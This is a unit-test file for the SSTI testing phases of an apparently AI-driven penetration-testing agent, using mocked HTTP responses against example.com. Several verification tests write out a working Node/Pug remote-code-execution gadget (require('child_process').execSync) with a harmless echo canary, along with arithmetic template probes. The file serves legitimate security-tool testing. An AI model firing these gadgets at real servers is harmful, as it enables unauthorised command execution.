"""Unit tests for the adaptive SSTI methodology phases.

Mirrors the SQLi/NoSQL methodology tests: each phase is exercised in isolation
with a mocked ``_send_probe`` / ``_http_get`` and a silent LLM (so the
deterministic, engine-grounded fallbacks drive), plus an end-to-end run and an
N/A check on a non-template (literal-reflection) stack — no false emission.

The probe mock simulates a template engine: an arithmetic payload in the
engine's syntax returns the *product* (evaluation); any other syntax — or any
payload on a non-template stack — echoes the literal back (reflection, no eval).
"""

from __future__ import annotations

import re
from typing import Any
from unittest.mock import AsyncMock

import pytest

from clinkz.agents.exploit import (
    _SSTI_JINJA_PROBE,
    ExploitAgent,
    PageAnalysis,
    _HTTPResponse,
)
from clinkz.llm.base import LLMClient, LLMMessage
from clinkz.models.methodology import (
    SSTIExploitationType,
    SSTIPrimitives,
    SSTITemplateEngine,
)
from clinkz.models.scan import Endpoint, ParamLocation
from clinkz.models.scope import EngagementScope, ScopeEntry, ScopeType
from clinkz.state import StateStore
from clinkz.tools.resolver import ToolResolver

SCOPE = EngagementScope(
    name="methodology-ssti-test",
    targets=[ScopeEntry(value="example.com", type=ScopeType.DOMAIN)],
)

# Per-engine "does this payload use MY syntax" matchers — unambiguous so a bare
# ``{`` engine never claims a ``{{`` payload (and vice versa).
_SYNTAX_RE: dict[str, re.Pattern[str]] = {
    "#{}": re.compile(r"^#\{"),
    "<%= %>": re.compile(r"^<%="),
    "${}": re.compile(r"^\$\{"),
    "{{}}": re.compile(r"^\{\{"),
    "{}": re.compile(r"^\{[^{]"),
}
_ARITH = re.compile(r"(\d+)\*(\d+)")
_ECHO = re.compile(r"echo (clinkzssti\d+)")


# ---------------------------------------------------------------------------
# Mocks / fixtures
# ---------------------------------------------------------------------------


class _SilentLLM(LLMClient):
    """LLM whose ``generate_text`` returns "" so deterministic fallbacks drive."""

    async def reason(
        self, messages: list[LLMMessage], tools: list[dict[str, Any]] | None = None
    ) -> Any:
        raise NotImplementedError

    async def research(self, query: str) -> str:
        return ""

    async def generate_text(self, prompt: str) -> str:
        return ""


def _make_state() -> AsyncMock:
    state = AsyncMock(spec=StateStore)
    state.get_findings = AsyncMock(return_value=[])
    state.add_finding = AsyncMock(return_value="finding-001")
    state.get_new_endpoints = AsyncMock(return_value=[])
    state.log_action = AsyncMock()
    return state


def _make_agent() -> ExploitAgent:
    agent = ExploitAgent(
        llm=_SilentLLM(),
        tools=[],
        scope=SCOPE,
        state=_make_state(),
        engagement_id="methodology-ssti-test",
        resolver=ToolResolver(),
        persistent_kb=None,
    )
    agent._methodology_llm = agent.llm
    return agent


def _query_page(
    url: str = "http://example.com/profile?username=x", params: tuple[str, ...] = ("username",)
) -> PageAnalysis:
    return PageAnalysis(url=url, body="", status=200, input_params=list(params))


def _form_page(url: str = "http://example.com/profile") -> PageAnalysis:
    form = {
        "action": "",
        "method": "POST",
        "fields": [{"name": "username", "type": "text", "value": ""}],
    }
    return PageAnalysis(url=url, body="", status=200, input_params=["username"], forms=[form])


def _resp(status: int, body: str = "", headers: dict[str, str] | None = None) -> _HTTPResponse:
    return _HTTPResponse(status=status, body=body, headers=headers or {})


def _engine_sim(syntax: str, *, jinja_marker: bool = False, rce: bool = True):
    """A ``_send_probe`` side-effect simulating a template engine.

    Evaluates only payloads in *syntax*: arithmetic → the product, an RCE
    ``echo <canary>`` gadget → the canary in command-output position. Any other
    syntax (or the wrong engine) echoes the literal (reflection, no eval). The
    Jinja-distinguish probe returns ``7777777`` (Jinja2) or ``49`` (JS) per
    *jinja_marker*.
    """
    rx = _SYNTAX_RE[syntax]

    async def respond(page: PageAnalysis, param: str, value: str) -> _HTTPResponse:
        if value == _SSTI_JINJA_PROBE:
            return _resp(200, "7777777" if jinja_marker else "49")
        if rx.match(value):
            m = _ARITH.search(value)
            if m:
                return _resp(200, f"<p>{int(m.group(1)) * int(m.group(2))}</p>")
            em = _ECHO.search(value)
            if em and rce:
                return _resp(200, f"<pre>{em.group(1)}</pre>")
        return _resp(200, f"Hello {value}")  # literal reflection / no eval

    return respond


async def _no_eval(page: PageAnalysis, param: str, value: str) -> _HTTPResponse:
    """A non-template stack: every payload comes straight back (DVWA-shaped)."""
    return _resp(200, f"<html>Hello {value}</html>")


def _probes(*evaluated: str) -> list[dict[str, Any]]:
    """A phase-1 probe list marking *evaluated* syntaxes as having evaluated."""
    from clinkz.agents.exploit import _SSTI_POLYGLOT_PROBES

    return [
        {"syntax": label, "evaluated": label in evaluated, "status": 200}
        for label, _prefix, _suffix in _SSTI_POLYGLOT_PROBES
    ]


# ===========================================================================
# Phase 1 — injection-point mapping (polyglot arithmetic evaluation)
# ===========================================================================


@pytest.mark.asyncio
async def test_phase1_pug_eval_is_candidate() -> None:
    """A ``#{a*b}`` probe that renders the product → candidate (Pug)."""
    agent = _make_agent()
    agent._send_probe = AsyncMock(side_effect=_engine_sim("#{}"))  # type: ignore[method-assign]
    is_candidate, probes = await agent._ssti_phase1_injection_point(_query_page(), "username")
    assert is_candidate is True
    assert [p["syntax"] for p in probes if p["evaluated"]] == ["#{}"]


@pytest.mark.asyncio
async def test_phase1_literal_reflection_not_candidate() -> None:
    """A non-template stack (literal reflection only) → not a candidate."""
    agent = _make_agent()
    agent._send_probe = AsyncMock(side_effect=_no_eval)  # type: ignore[method-assign]
    is_candidate, probes = await agent._ssti_phase1_injection_point(_query_page(), "username")
    assert is_candidate is False
    assert all(not p["evaluated"] for p in probes)


@pytest.mark.asyncio
async def test_phase1_second_order_readback() -> None:
    """A form-backed param whose eval renders on a read-back GET → candidate.

    Reproduces Juice Shop's Pug ``/profile`` username: the POST that sets the
    username 302-redirects with no body, and the eval renders on the next GET.
    """
    agent = _make_agent()
    last: dict[str, str] = {}

    async def submit(page: PageAnalysis, param: str, value: str) -> _HTTPResponse:
        last["value"] = value
        return _resp(302, "", {"Location": "/profile"})  # redirect, no eval in-response

    async def readback(url: str, params: dict[str, str]) -> _HTTPResponse:
        v = last.get("value", "")
        if v.startswith("#{"):
            m = _ARITH.search(v)
            if m:
                return _resp(200, f"<h1>{int(m.group(1)) * int(m.group(2))}</h1>")
        return _resp(200, "<h1>profile</h1>")

    agent._send_probe = AsyncMock(side_effect=submit)  # type: ignore[method-assign]
    agent._http_get = AsyncMock(side_effect=readback)  # type: ignore[method-assign]
    is_candidate, probes = await agent._ssti_phase1_injection_point(_form_page(), "username")
    assert is_candidate is True
    assert "#{}" in [p["syntax"] for p in probes if p["evaluated"]]


# ===========================================================================
# Phase 2 — engine fingerprinting
# ===========================================================================


@pytest.mark.asyncio
async def test_phase2_pug() -> None:
    """``#{}`` evaluation → Pug, RCE gadget available."""
    agent = _make_agent()
    agent._send_probe = AsyncMock(side_effect=_engine_sim("#{}"))  # type: ignore[method-assign]
    engine, primitives, _ = await agent._ssti_phase2_fingerprint(
        _query_page(), "username", _probes("#{}")
    )
    assert engine is SSTITemplateEngine.PUG
    assert primitives.rce_gadget_supported is True


@pytest.mark.asyncio
async def test_phase2_ejs() -> None:
    """``<%= %>`` evaluation → EJS (Node-prioritized)."""
    agent = _make_agent()
    agent._send_probe = AsyncMock(side_effect=_engine_sim("<%= %>"))  # type: ignore[method-assign]
    engine, primitives, _ = await agent._ssti_phase2_fingerprint(
        _query_page(), "username", _probes("<%= %>")
    )
    assert engine is SSTITemplateEngine.EJS
    assert primitives.rce_gadget_supported is True


@pytest.mark.asyncio
async def test_phase2_jinja2_vs_nunjucks_distinguished() -> None:
    """``{{}}`` + ``{{7*'7'}}`` distinguishes Jinja2 (7777777) from Nunjucks (49)."""
    agent = _make_agent()

    # Jinja2: the distinguish probe yields the Python string-repeat marker.
    agent._send_probe = AsyncMock(  # type: ignore[method-assign]
        side_effect=_engine_sim("{{}}", jinja_marker=True)
    )
    engine, _, _ = await agent._ssti_phase2_fingerprint(_query_page(), "username", _probes("{{}}"))
    assert engine is SSTITemplateEngine.JINJA2

    # Nunjucks (non-PHP stack): the distinguish probe yields 49 (JS coercion).
    agent2 = _make_agent()
    agent2._send_probe = AsyncMock(side_effect=_engine_sim("{{}}"))  # type: ignore[method-assign]
    engine2, _, _ = await agent2._ssti_phase2_fingerprint(
        _query_page(), "username", _probes("{{}}")
    )
    assert engine2 is SSTITemplateEngine.NUNJUCKS


# ===========================================================================
# Phase 3 — exploitation-type ranking
# ===========================================================================


@pytest.mark.asyncio
async def test_phase3_na_guard_returns_empty() -> None:
    """No engine and no evaluating syntax → empty ranking (the N/A gate)."""
    agent = _make_agent()
    primitives = SSTIPrimitives(engine=SSTITemplateEngine.UNKNOWN)
    ranked = await agent._ssti_phase3_rank_exploitation_types(
        SSTITemplateEngine.UNKNOWN, primitives, {}
    )
    assert ranked == []


@pytest.mark.asyncio
async def test_phase3_fallback_rce_capable() -> None:
    """An RCE-capable engine (silent LLM) → RCE first, then expression_eval."""
    agent = _make_agent()
    primitives = SSTIPrimitives(
        engine=SSTITemplateEngine.PUG, evaluating_syntaxes=["#{}"], rce_gadget_supported=True
    )
    ranked = await agent._ssti_phase3_rank_exploitation_types(
        SSTITemplateEngine.PUG, primitives, {}
    )
    assert ranked[0] is SSTIExploitationType.RCE
    assert SSTIExploitationType.EXPRESSION_EVAL in ranked


@pytest.mark.asyncio
async def test_phase3_fallback_non_rce_engine() -> None:
    """An engine with no gadget → expression_eval only (no phantom RCE rank)."""
    agent = _make_agent()
    primitives = SSTIPrimitives(engine=SSTITemplateEngine.HANDLEBARS, evaluating_syntaxes=["{{}}"])
    ranked = await agent._ssti_phase3_rank_exploitation_types(
        SSTITemplateEngine.HANDLEBARS, primitives, {}
    )
    assert ranked == [SSTIExploitationType.EXPRESSION_EVAL]


# ===========================================================================
# Phase 4 — payload synthesis (engine-conditioned)
# ===========================================================================


@pytest.mark.asyncio
async def test_phase4_eval_uses_engine_syntax() -> None:
    """Expression-eval synthesis wraps arithmetic in the fingerprinted syntax."""
    agent = _make_agent()
    primitives = SSTIPrimitives(engine=SSTITemplateEngine.PUG, evaluating_syntaxes=["#{}"])
    synth = await agent._ssti_phase4_synthesize_payload(
        SSTIExploitationType.EXPRESSION_EVAL, SSTITemplateEngine.PUG, primitives
    )
    assert synth is not None
    assert synth["payload"].startswith("#{")
    assert synth["indicator_type"] == "eval"
    # expected_indicator is the product embedded in the payload.
    m = _ARITH.search(synth["payload"])
    assert m and synth["expected_indicator"] == str(int(m.group(1)) * int(m.group(2)))


@pytest.mark.asyncio
async def test_phase4_rce_uses_engine_gadget() -> None:
    """RCE synthesis emits the engine gadget with a benign echo canary."""
    agent = _make_agent()
    primitives = SSTIPrimitives(
        engine=SSTITemplateEngine.PUG, evaluating_syntaxes=["#{}"], rce_gadget_supported=True
    )
    synth = await agent._ssti_phase4_synthesize_payload(
        SSTIExploitationType.RCE, SSTITemplateEngine.PUG, primitives
    )
    assert synth is not None
    assert "child_process" in synth["payload"]
    assert f"echo {synth['expected_indicator']}" in synth["payload"]
    assert synth["indicator_type"] == "command_output"


@pytest.mark.asyncio
async def test_phase4_rce_declined_without_gadget() -> None:
    """RCE synthesis declines for an engine with no known gadget."""
    agent = _make_agent()
    primitives = SSTIPrimitives(engine=SSTITemplateEngine.HANDLEBARS, evaluating_syntaxes=["{{}}"])
    synth = await agent._ssti_phase4_synthesize_payload(
        SSTIExploitationType.RCE, SSTITemplateEngine.HANDLEBARS, primitives
    )
    assert synth is None


# ===========================================================================
# Phase 5 — verification (reflection-honest)
# ===========================================================================


@pytest.mark.asyncio
async def test_phase5_eval_confirmed() -> None:
    """The product rendered in a normal response (literal absent) confirms."""
    agent = _make_agent()
    agent._send_probe = AsyncMock(  # type: ignore[method-assign]
        return_value=_resp(200, "<p>2491</p>")
    )
    synth = {"payload": "#{47*53}", "expected_indicator": "2491", "indicator_type": "eval"}
    ok, observed = await agent._ssti_phase5_verify(
        _query_page(), "username", SSTIExploitationType.EXPRESSION_EVAL, synth
    )
    assert ok is True
    assert "2491" in observed


@pytest.mark.asyncio
async def test_phase5_eval_literal_reflection_rejected() -> None:
    """The literal payload echoed back with no product is reflection, not eval."""
    agent = _make_agent()
    agent._send_probe = AsyncMock(  # type: ignore[method-assign]
        return_value=_resp(200, "Hello #{47*53}")  # literal only, never evaluated
    )
    synth = {"payload": "#{47*53}", "expected_indicator": "2491", "indicator_type": "eval"}
    ok, _ = await agent._ssti_phase5_verify(
        _query_page(), "username", SSTIExploitationType.EXPRESSION_EVAL, synth
    )
    assert ok is False


@pytest.mark.asyncio
async def test_phase5_eval_confirms_despite_literal_reflection() -> None:
    """Regression (Juice Shop /profile): literal reflected in an input value AND
    the product rendered elsewhere must still confirm — the literal reflection
    must not suppress detection of the evaluated product.
    """
    agent = _make_agent()
    # The profile page reflects the raw username in value="#{47*53}" AND renders
    # the evaluated 2491 in a <p> — both present in one body.
    body = '<p style="text-align:center">2491</p><input name="username" value="#{47*53}">'
    agent._send_probe = AsyncMock(return_value=_resp(200, body))  # type: ignore[method-assign]
    synth = {"payload": "#{47*53}", "expected_indicator": "2491", "indicator_type": "eval"}
    ok, observed = await agent._ssti_phase5_verify(
        _query_page(), "username", SSTIExploitationType.EXPRESSION_EVAL, synth
    )
    assert ok is True
    assert "2491" in observed


@pytest.mark.asyncio
async def test_phase5_rce_canary_confirmed() -> None:
    """The echo canary alone in command-output position confirms RCE."""
    agent = _make_agent()
    agent._send_probe = AsyncMock(  # type: ignore[method-assign]
        return_value=_resp(200, "<pre>clinkzssti424242</pre>")
    )
    payload = (
        "#{global.process.mainModule.require('child_process').execSync('echo clinkzssti424242')}"
    )
    synth = {
        "payload": payload,
        "expected_indicator": "clinkzssti424242",
        "indicator_type": "command_output",
    }
    ok, observed = await agent._ssti_phase5_verify(
        _query_page(), "username", SSTIExploitationType.RCE, synth
    )
    assert ok is True
    assert "clinkzssti424242" in observed


@pytest.mark.asyncio
async def test_phase5_rce_reflection_in_error_rejected() -> None:
    """A canary echoed in a 500 error body is reflection, not execution."""
    agent = _make_agent()
    payload = "#{global.process.mainModule.require('child_process').execSync('echo clinkzssti999')}"
    agent._send_probe = AsyncMock(  # type: ignore[method-assign]
        return_value=_resp(500, f"Internal Server Error: {payload}")
    )
    synth = {
        "payload": payload,
        "expected_indicator": "clinkzssti999",
        "indicator_type": "command_output",
    }
    ok, _ = await agent._ssti_phase5_verify(
        _query_page(), "username", SSTIExploitationType.RCE, synth
    )
    assert ok is False


@pytest.mark.asyncio
async def test_phase5_rce_confirms_despite_gadget_reflection() -> None:
    """Regression (Juice Shop /profile): the full gadget reflected (HTML-escaped,
    carrying ``echo <canary>``) in an input value AND the bare executed canary
    rendered elsewhere must confirm — the scaffold reflection must not suppress
    the bare command-output canary.
    """
    agent = _make_agent()
    payload = "#{global.process.mainModule.require('child_process').execSync('echo clinkzssti555')}"
    # Pug escapes ' as &#39; in the input value; the executed canary renders bare.
    body = (
        "<p>clinkzssti555</p>"
        '<input name="username" value="#{global.process.mainModule.require(&#39;'
        'child_process&#39;).execSync(&#39;echo clinkzssti555&#39;)}">'
    )
    agent._send_probe = AsyncMock(return_value=_resp(200, body))  # type: ignore[method-assign]
    synth = {
        "payload": payload,
        "expected_indicator": "clinkzssti555",
        "indicator_type": "command_output",
    }
    ok, observed = await agent._ssti_phase5_verify(
        _query_page(), "username", SSTIExploitationType.RCE, synth
    )
    assert ok is True
    assert "clinkzssti555" in observed


# ===========================================================================
# End-to-end + N/A contract + wiring
# ===========================================================================


@pytest.mark.asyncio
async def test_end_to_end_pug_rce_emits_critical() -> None:
    """A Pug eval point is taken end-to-end to a critical RCE finding."""
    agent = _make_agent()
    agent._send_probe = AsyncMock(side_effect=_engine_sim("#{}"))  # type: ignore[method-assign]
    findings = await agent._test_ssti(_query_page())
    assert len(findings) >= 1
    finding = findings[0]
    assert "template injection" in finding.title.lower()
    assert finding.severity.value == "critical"
    assert any("engine=pug" in ev for ev in finding.evidence)
    assert any("exploitation_type=rce" in ev for ev in finding.evidence)
    assert any("phases_completed=" in ev for ev in finding.evidence)


@pytest.mark.asyncio
async def test_end_to_end_eval_only_emits_high() -> None:
    """An eval-capable but non-RCE engine emits a high-severity eval finding."""
    agent = _make_agent()
    # Nunjucks {{}} evaluates arithmetic but the simulator refuses the gadget,
    # so RCE verification fails and the methodology falls back to eval (high).
    agent._send_probe = AsyncMock(  # type: ignore[method-assign]
        side_effect=_engine_sim("{{}}", rce=False)
    )
    findings = await agent._test_ssti(_query_page())
    assert len(findings) >= 1
    finding = findings[0]
    assert finding.severity.value == "high"
    assert any("exploitation_type=expression_eval" in ev for ev in finding.evidence)


@pytest.mark.asyncio
async def test_na_on_non_template_stack_no_emission() -> None:
    """On a literal-reflection (non-template) stack the methodology emits nothing."""
    agent = _make_agent()
    agent._send_probe = AsyncMock(side_effect=_no_eval)  # type: ignore[method-assign]
    findings = await agent._test_ssti(_query_page())
    assert findings == []


def test_ssti_queued_by_applicable_methods() -> None:
    """The planner routes _test_ssti to a parameterized endpoint (planner→dispatch)."""
    agent = _make_agent()
    endpoint = Endpoint(url="http://example.com/profile", method="POST", params=["username"])
    methods = agent._applicable_methods_for_endpoint(endpoint)
    assert "_test_ssti" in methods


def test_ssti_json_body_endpoint_queued() -> None:
    """A JSON-body endpoint (no query) still queues _test_ssti."""
    agent = _make_agent()
    endpoint = Endpoint(
        url="http://example.com/api/render",
        method="POST",
        params=["template"],
        param_locations={"template": ParamLocation.JSON_BODY},
    )
    methods = agent._applicable_methods_for_endpoint(endpoint)
    assert "_test_ssti" in methods
